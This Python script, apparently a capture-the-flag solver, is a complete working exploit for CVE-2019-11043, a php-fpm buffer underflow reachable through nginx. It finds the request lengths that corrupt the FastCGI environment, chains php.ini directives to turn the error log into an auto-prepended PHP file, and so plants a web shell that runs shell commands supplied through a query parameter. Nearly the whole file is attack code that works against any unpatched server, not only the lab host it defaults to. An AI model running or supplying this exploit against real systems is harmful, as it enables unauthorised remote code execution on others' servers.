#!/usr/bin/env python3
"""
17 - CVE-2019-11043: php-fpm buffer underflow -> RCE.

A from-scratch Python implementation of Emil "neex" Lerner's PHuiP-FPizdaM
(https://github.com/neex/phuip-fpizdam).  Same algorithm, same constants, no
FastCGI client: everything is driven over plain HTTP through nginx.

  1. every request is  GET <script>/<path info with a %0A>?QQQQ...
     nginx fails to split the path, sends PATH_INFO="" and php-fpm computes
     path_info = env_path_info + pilen - slen, which underflows;
  2. the single NUL byte it then writes lands on the LSB of the `pos` field of
     the FastCGI env allocator when the *total* length of the environment is
     just right.  Two knobs move that total: the length of the query string
     (`qsl`) and the length of a junk header (`pisos`);
  3. with `pos` rewound, the next variable php-fpm stores overwrites data that
     is already there - we aim it at PHP_VALUE and get one php.ini directive
     per request, persisting inside that worker;
  4. nine directives later, php-fpm logs an "unable to load extension" error
     into a file that is also auto_prepend_file'd, and the error text contains
     backticks around $_GET[a].  That is the shell.

stdlib only.
"""

import http.client
import re
import string
import sys
import time
import urllib.parse

# ---- constants, straight out of consts.go -------------------------------
USER_AGENT = "Mozilla/5.0"
POS_OFFSET = 34
SETTING_ENABLE_RETRIES = 50
MIN_QSL = 1500
MAX_QSL = 1950
QSL_DETECT_STEP = 5
MAX_QSL_DETECT_DELTA = 10
MAX_QSL_CANDIDATES = 10
MAX_PISOS_LENGTH = 256
BREAKING_PAYLOAD = "/PHP\nis_the_shittiest_lang.php"

# php.ini directives, in order.  Each one is set by a separate request; they
# accumulate inside whichever worker happens to serve them.
CHAIN = [
    "short_open_tag=1",          # so that "<?=" is enough to open a tag
    "html_errors=0",             # keep the error log free of markup
    "include_path=/tmp",         # where auto_prepend_file will look
    "auto_prepend_file=a",       # /tmp/a - which is also the error log
    "log_errors=1",
    "error_reporting=2",         # E_WARNING
    "error_log=/tmp/a",
    'extension_dir="<?=`"',      # the error message becomes PHP source...
    'extension="$_GET[a]`?>"',   # ...with $_GET[a] inside backticks
]

FLAG_RE = re.compile(rb"PHRACK\{[^}]{1,120}\}")
# neex's rule: no character in here may need percent-encoding (space excepted),
# because the query string length is what we are aiming with.
READ_FLAG = "a=/bin/cat+/flag.txt&"
DETECT_ENABLE = "session.auto_start=1"
DETECT_DISABLE = "session.auto_start=0"

# Go's url.EscapedPath() keeps these bytes as-is in the path component.
PATH_SAFE = set(string.ascii_letters + string.digits + "-_.~" + "$&+,/:;=@")


def escape_path(path: str) -> str:
    out = []
    for byte in path.encode():
        char = chr(byte)
        out.append(char if char in PATH_SAFE else "%%%02X" % byte)
    return "".join(out)


def make_path_info(php_value: str) -> str:
    """/PHP_VALUE\\n<directive> padded with ';' to exactly POS_OFFSET bytes."""
    path_info = "/PHP_VALUE\n" + php_value
    if len(path_info) > POS_OFFSET:
        raise ValueError("directive too long: %r" % php_value)
    return path_info + ";" * (POS_OFFSET - len(path_info))


class Requester:
    def __init__(self, url):
        parts = urllib.parse.urlsplit(url)
        if not parts.path.endswith(".php"):
            raise SystemExit("target must be a .php script, got %r" % url)
        self.host = parts.hostname
        self.port = parts.port or 80
        self.base_path = parts.path
        self.count = 0

    def request(self, path_info, qsl, pisos, prefix=""):
        if not path_info.startswith("/"):
            raise ValueError(path_info)
        escaped = escape_path(path_info)
        # Percent-encoding makes REQUEST_URI longer than PATH_INFO & friends;
        # the query string is counted twice in the environment (QUERY_STRING and
        # REQUEST_URI), hence the /2.
        qsl_delta = len(escaped) - len(path_info)
        qsl_prime = qsl - qsl_delta // 2 - len(prefix)
        if qsl_prime < 0:
            raise ValueError("qsl too small")
        target = "%s%s?%s%s" % (self.base_path, escaped, prefix, "Q" * qsl_prime)

        conn = http.client.HTTPConnection(self.host, self.port, timeout=15)
        try:
            conn.request("GET", target, headers={
                "User-Agent": USER_AGENT,
                # the junk header is the fine-tuning knob for the env layout
                "D-Pisos": "8" + "=" * pisos + "D",
                "Ebut": "mamku tvoyu",
                "Connection": "close",
            })
            resp = conn.getresponse()
            body = resp.read()
            self.count += 1
            return resp.status, resp.getheader("Set-Cookie") or "", body
        finally:
            conn.close()


def log(msg):
    print("[*] %s" % msg, flush=True)


def ok(msg):
    print("[+] %s" % msg, flush=True)


class Failure(Exception):
    pass


def detect(req, strict=True):
    """Find (qsl, pisos): the two lengths that make the NUL land on pos."""
    base_status, _, _ = req.request("/path\ninfo.php", MIN_QSL, 1)
    log("base status code is %d" % base_status)

    candidates = []
    for qsl in range(MIN_QSL, MAX_QSL + 1, QSL_DETECT_STEP):
        status, _, _ = req.request(BREAKING_PAYLOAD, qsl, 1)
        if status != base_status:
            log("status %d for qsl=%d - candidate" % (status, qsl))
            candidates.append(qsl)
    if not candidates:
        raise Failure("no qsl candidate: target looks patched")
    if len(candidates) > MAX_QSL_CANDIDATES:
        raise Failure("too many qsl candidates, something is filtering us")

    extended = sorted({c - d for c in candidates
                       for d in range(0, MAX_QSL_DETECT_DELTA + 1, QSL_DETECT_STEP)})
    ok("target is vulnerable; qsl candidates: %s" % extended)

    # the same request without the crafted lengths must behave normally
    for _ in range(5):
        status, cookie, _ = req.request("/PHP\nSOSAT", MAX_QSL, MAX_PISOS_LENGTH)
        if status != base_status or "PHPSESSID" in cookie:
            if strict:
                raise Failure("sanity check failed (already poisoned?)")
            log("sanity check unhappy - a previous round poisoned a worker, "
                "carrying on anyway")
            break

    payload = make_path_info(DETECT_ENABLE)
    for attempt in range(SETTING_ENABLE_RETRIES):
        for qsl in extended:
            for pisos in range(1, MAX_PISOS_LENGTH + 1):
                _, cookie, _ = req.request(payload, qsl, pisos)
                if "PHPSESSID" in cookie:
                    ok("attack params found: qsl=%d pisos=%d (%d requests)"
                       % (qsl, pisos, req.count))
                    # put the worker back the way we found it
                    for _ in range(SETTING_ENABLE_RETRIES):
                        req.request(make_path_info(DETECT_DISABLE), qsl, pisos)
                    return qsl, pisos
        log("pass %d/%d done, still looking (%d requests so far)"
            % (attempt + 1, SETTING_ENABLE_RETRIES, req.count))
    raise Failure("could not find attack params")


def attack(req, qsl, pisos, deadline):
    log("poisoning php.ini, one directive per request")
    rounds = 0
    while time.time() < deadline:
        rounds += 1
        for directive in CHAIN:
            _, _, body = req.request(make_path_info(directive), qsl, pisos,
                                     prefix=READ_FLAG)
            match = FLAG_RE.search(body)
            if match:
                ok("command execution after %d rounds / %d requests"
                   % (rounds, req.count))
                return match.group(0).decode()
        if rounds % 5 == 0:
            log("round %d, still infecting workers (%d requests)"
                % (rounds, req.count))
    return None


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else "http://challenge/index.php"
    budget = float(sys.argv[2]) if len(sys.argv) > 2 else 600.0
    deadline = time.time() + budget
    started = time.time()

    req = Requester(url)
    log("target: %s (budget %.0fs)" % (url, budget))

    # The bug is a memory corruption: it is allowed to fail.  Keep trying until
    # the budget runs out - every round re-detects the parameters, because a
    # half-poisoned worker shifts them around.
    round_no = 0
    while time.time() < deadline:
        round_no += 1
        log("--- attempt %d ---" % round_no)
        try:
            qsl, pisos = detect(req, strict=(round_no == 1))
            flag = attack(req, qsl, pisos, deadline)
        except Failure as exc:
            log("attempt %d failed: %s" % (round_no, exc))
            continue
        except (OSError, http.client.HTTPException) as exc:
            log("attempt %d: network error (%s), php-fpm is probably "
                "restarting" % (round_no, exc))
            time.sleep(2)
            continue
        if flag:
            log("done in %.1fs, %d attempts, %d HTTP requests"
                % (time.time() - started, round_no, req.count))
            print("FLAG: %s" % flag)
            return 0

    print("[-] no flag within the time budget (%d requests)" % req.count,
          flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
